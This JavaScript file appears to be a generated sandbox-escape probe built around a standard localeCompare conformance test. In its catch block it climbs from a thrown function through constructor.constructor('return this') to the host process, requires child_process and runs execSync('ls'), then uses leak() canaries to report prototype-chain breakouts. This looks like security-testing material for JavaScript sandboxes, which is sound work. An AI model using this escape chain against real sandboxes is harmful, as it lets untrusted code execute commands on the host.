try {
    var thisValues = [
        'true',
        '5',
        'hello',
        'good bye'
    ];
    var thatValues = [
        true,
        5,
        'hello',
        {
            toString: function () {
                throw () => {
                    return () => {
                    };
                };
                return 'good bye';
            }
        }
    ];
    var i;
    for (i = 0; i < thisValues.length; i++) {
        var j;
        for (j = 0; j < thatValues.length; j++) {
            var result = String.prototype.localeCompare.call(thisValues[i], thatValues[j]);
            assert.sameValue(result === 0, i === j, 'localeCompare treats ' + thisValues[i] + ' and ' + thatValues[j] + ' as ' + (result === 0 ? 'equal' : 'different') + '.');
        }
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}